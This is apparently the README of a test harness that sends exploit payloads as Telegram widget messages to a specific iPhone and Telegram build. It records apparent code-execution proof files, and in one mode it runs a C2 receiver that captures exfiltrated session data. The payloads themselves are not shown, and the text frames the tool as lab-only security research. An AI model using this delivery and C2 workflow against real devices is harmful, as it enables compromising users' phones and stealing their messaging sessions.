# iPhone 17e test runner (`i17e_runner`)

Generic, host-only runner for the P1 / v14 / session matrices on a stock
iPhone 17e. It verifies the target device, cleans the chat, sends one widget
payload as the last message, captures console logs/screenshots/OCR, optionally
pulls `rce.txt`/`spdb` with `backup2`, deletes the payload again, and writes a
JSON + Markdown result per attempt.

No device is required to install, inspect or test this tool. The live commands
are documented at the bottom; use them only on your own lab device.

## Target

| field | value |
|---|---|
| model | `iPhone18,5` |
| OS | iOS `27.0`, build `24A437` |
| app | `ph.telegra.Telegraph`, Telegram `13.2` (`36535`) |
| USB | `05ac:12a8` |
| screen | 1170 × 2532 |

Any mismatch stops before a payload is sent. The UDID is never stored in the
tree; pass `--udid` or set `$I17E_UDID`.

## Install

The tool uses only the Python standard library. `rapidocr_onnxruntime` is
optional: when absent, OCR is recorded as unavailable and the console log
remains the authoritative marker channel.

```sh
cd lab/ios17e/tooling
# optional install (a venv avoids Debian's PEP 668 "externally managed" block):
python3 -m venv /tmp/i17e-venv
/tmp/i17e-venv/bin/pip install -e .
/tmp/i17e-venv/bin/i17e-runner --help

# or run directly from the source tree (no install, no third-party deps):
python3 -m i17e_runner --help
python3 -m unittest discover -s tests -t . -v
```

`pymobiledevice3` is resolved from `--p3`, `$I17E_PYMOBILEDEVICE3`, `PATH`, or
`<repo>/ios_sideload/venv/bin/pymobiledevice3` (in that order). The documented
USB recovery script is resolved from `--usb-recover`, `$I17E_USB_RECOVER`,
`tg-rce/docs/instrumentation/ios17e/usb_recover.py`, or the sanitized vendored
copy under `i17e_runner/vendor/`.

## Environment (never commit)

```sh
export BOT_TOKEN='<token of the bot that owns the target chat>'
export I17E_UDID='<UDID>'
export I17E_CHAT_ID='<chat id or @username>'
export I17E_APPGROUP='<AppGroup UUID, only for proof backup>'
export I17E_ACCOUNT_ID='<account directory id, optional redaction>'
# optional:
export I17E_PYMOBILEDEVICE3='/path/to/venv/bin/pymobiledevice3'
export I17E_RECOVER_PYTHON='/path/to/venv/bin/python'  # pyusb for recovery
export I17E_STATE_DIR='/path/to/local/state'   # ledger; default XDG state
```

The bot is selected by the **token**. There is no bot-specific flag and no bot
name in the tool. The token is never printed, logged or written to artifacts.

## Quick start

```sh
# 1. Verify the exact phone and app build. Wrong device/app = exit 3.
python3 -m i17e_runner doctor --udid "$I17E_UDID"

# 2. Clean the chat. Known ids come from the local ledger and/or --payload-id.
python3 -m i17e_runner clean --chat-id "$I17E_CHAT_ID" \
  --payload-id 1001 --anchor-id 1002

# 3. One v14 K3 attempt. Chat open at the bottom; payload must be last.
python3 -m i17e_runner run --label K3 \
  --html lab/ios17e/reliability_20261109/fix_v10/out/v14_stage_a.html \
  --payload-root "$PWD/../../.." \
  --chat-id "$I17E_CHAT_ID" --udid "$I17E_UDID" \
  --success-marker 'HIT=' --success-marker 'RESULT SS2' \
  --out runs/v14_k3

# 4. The whole K3p/K3/K4 block (K4 is gated on K3 10/10).
python3 -m i17e_runner matrix --spec examples/v14_k3_k4.json \
  --payload-root "$PWD/../../.." \
  --chat-id "$I17E_CHAT_ID" --udid "$I17E_UDID" \
  --out runs/v14_k3_k4
```

If the app relaunches to the chat list instead of the target chat, add the
tap that opens the chat row (coordinates are in the 1170×2532 screenshot
space; read them from a screenshot on the current layout):

```sh
python3 -m i17e_runner run --label K3 --tap 90,1919 ...
```

`--dry-run` validates the payload and prints the planned commands without any
network or device operation:

```sh
python3 -m i17e_runner run --label K3 --dry-run \
  --html lab/ios17e/reliability_20261109/fix_v10/out/v14_stage_a.html \
  --chat-id '<CHAT_ID>' --out /tmp/i17e-plan
```

## Matrix examples

`examples/v14_k3_k4.json` — K3p probe, K3 ×10, K4 ×6 gated on K3 10/10.
`examples/p1_v10.json` — P1 ×10 v10 plus the v0 control.
`examples/session_v14.json` — `session_v14_file_1m` (proof required) and
`session_v14_net_1m` (external C2 receiver, see below).

```sh
# v14 K3/K4 as a matrix (dry-run first; --strict makes any failure exit 1)
python3 -m i17e_runner matrix --spec examples/v14_k3_k4.json \
  --payload-root "$PWD/../../.." --dry-run --out /tmp/i17e-plan
python3 -m i17e_runner matrix --spec examples/v14_k3_k4.json \
  --payload-root "$PWD/../../.." --chat-id "$I17E_CHAT_ID" \
  --udid "$I17E_UDID" --out runs/v14_k3_k4 --strict
```

### Session: file mode

```sh
python3 -m i17e_runner run --label session_file \
  --html lab/ios17e/session_impact/out/session_v14_file_1m.html \
  --payload-root "$PWD/../../.." \
  --chat-id "$I17E_CHAT_ID" --udid "$I17E_UDID" \
  --appgroup "$I17E_APPGROUP" \
  --backup --require-proof \
  --backup-regex '<APPGROUP>.*rce.txt|.*spdb' \
  --success-marker 'RESULT SS2' --success-marker 'HIT=' \
  --out runs/session_file
```

`--backup` runs `pymobiledevice3 backup2 backup <dir> --only-regex
'<APPGROUP>.*rce.txt|.*spdb'` (current CLI) and resolves the filtered files
through `Manifest.db`. Older documented CLIs can use `--backup-cli legacy`,
which runs the shorthand `backup2 --only-regex ...` form.

### Session: network mode

The TCP receiver is a separate host tool. Start it before the send, then run
the payload; the runner itself never opens a listening socket:

```sh
python3 lab/ios17e/session_impact/tools/c2_recv.py --port 4453 \
  --out /tmp/opencode/sess_cap.bin --parse &

python3 -m i17e_runner run --label session_net \
  --html lab/ios17e/session_impact/out/session_v14_net_1m.html \
  --payload-root "$PWD/../../.." \
  --chat-id "$I17E_CHAT_ID" --udid "$I17E_UDID" \
  --success-marker 'RESULT SS2' --success-marker 'HIT=' \
  --success-marker '\bOK\b' --out runs/session_net
```

## What one `run` does

```
payload inspect (raw <= 32768, zlib9 <= 4096, sha256)
  -> device check (UDID, iPhone18,5, iOS 27.0 24A437, app 13.2/36535)
  -> chat clean (ledger + --payload-id/--anchor-id/--delete-id)
  -> optional screenshot/OCR check for old widget markers
  -> launch-application ph.telegra.Telegraph --console --userspace
  -> optional post-launch HID taps/drags (--tap X,Y / --drag X1,Y1,X2,Y2)
  -> record log offset, sendWidget (payload is the last message)
  -> screenshots at 0.6 s + n*0.25 s, then 5 s and 10 s
  -> console tail from the send offset + optional OCR
  -> app state from the console process
  -> optional backup2 proof pull (rce.txt/spdb)
  -> delete the payload message again; record ids
  -> JSON + Markdown result, console attachment terminated
```

Commands print the structured result to stdout and progress to stderr, so
`... | jq .` works without filtering log lines.

The chat gate is a hard gate: if a known payload/anchor id cannot be deleted,
or OCR still sees a payload marker in the pre-send screenshot, the run stops
with exit code 5 and no payload is sent. A run in a dirty chat is not a data
point.

The Bot API has no chat-history endpoint, so the local ledger is the
authoritative list of payload ids. Import ids from older run notes with
`--payload-id`/`--anchor-id` (or `--delete-id` on `run`); the pre-send
screenshot/OCR is the second, independent check.

## Results

Every attempt produces:

```
<out>/attempts/<label>_<n>_<stamp>.json   full structured result
<out>/attempts/<label>_<n>_<stamp>.md     human-readable result
<out>/results.jsonl                       one redacted JSON line per attempt
<out>/logs/<label>_<n>_console.log        app console output
<out>/shots/<label>_<n>_sNN.png           screenshots
<out>/backups/<label>_<n>/                filtered backup + copied matches
<out>/matrix_summary.json + SUMMARY.md    matrix only
```

Each attempt records the marker fields (`HIT`, `LEN`, `R`, `M`, `PH`, `NT`),
guard token, app state (`alive`/`dead`/`unknown`), proof (`rce_ok`, `spdb_ok`,
matches and sha256), cleanup ids, timings in an ISO-8601 + monotonic timeline,
and the exact commands/log offsets. See [`docs/RESULT_SCHEMA.md`](docs/RESULT_SCHEMA.md).

Artifacts are redacted by default: token, UDID, chat id, AppGroup UUID and the
home directory become `<BOT_TOKEN>`, `<UDID>`, `<CHAT_ID>`, `<APPGROUP>`,
`<HOME>`. Use `--no-redact` only for local debugging; never commit those files.

## Verdicts and exit codes

| status | meaning |
|---|---|
| `pass` | success marker and/or required proof found |
| `fail` | run completed but the expected evidence is missing; no marker, app death, guard, or proof missing |
| `invalid` | wrong device/app, dirty chat, launch/send failure, USB unavailable; not a data point |
| `error` | host command/timeout or unexpected failure |
| `plan` | `--dry-run` |
| `manual` | `--expect manual` |

Exit codes: `0` success/plan, `1` measured failure, `2` config/payload,
`3` wrong device/app, `4` USB unavailable, `5` chat not clean, `6` other error.

## USB recovery and process hygiene

If `usbmux list` is empty, the runner calls the documented `usb_recover.py`
(stop usbmuxd → pyusb reset / `set_configuration(3)` → start usbmuxd → check
the UDID) and retries the operation. The same bounded retry is used for
screenshots and the proof backup. Every console attachment is terminated in a
`finally` block, and the result records any leftover CoreDevice/Frida PIDs. The
tool never starts Frida and never installs/launches anything other than the
target app.

## Operator preconditions (not automatable here)

* phone awake, unlocked, trusted; DDI mounted;
* Telegram open with the bot chat at the bottom; optional `--tap`/`--drag`
  can drive a simple post-launch open, but scrolling remains operator-assisted;
* one widget per open; do not move the chat between send and render;
* `BOT_TOKEN` is the token of the bot that owns the chat.

## Tests

```sh
cd lab/ios17e/tooling
python3 -m unittest discover -s tests -t . -v
```

The suite is host-only: a fake command runner, fake Bot API transport, fake
OCR and a fake CoreDevice layer. No real UDID, token, chat id or AppGroup is
present in the tree; tests use obvious fakes.

## Sanitization

* No bot token, chat id, UDID, account id or AppGroup UUID is stored here.
* Examples use placeholders (`<APPGROUP>`, `<UDID>`, `<CHAT_ID>`) expanded at
  runtime.
* The ledger lives outside the repository (`$XDG_STATE_HOME/i17e_runner` by
  default); `runs/`, `*.jsonl` and local logs are gitignored.
* Use the local LAN/localhost only; no third-party tunnel is used by this tool.
